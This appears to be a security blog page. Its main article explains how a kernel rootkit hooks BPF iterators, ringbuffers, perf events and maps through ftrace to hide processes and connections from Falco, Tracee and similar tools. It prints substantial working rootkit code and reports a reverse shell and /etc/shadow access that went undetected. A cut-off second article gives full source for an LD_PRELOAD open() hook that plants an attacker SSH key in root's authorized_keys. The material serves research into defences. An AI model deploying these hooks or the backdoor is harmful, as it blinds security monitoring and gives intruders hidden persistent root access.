https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And several other things.\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And several other things.\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking 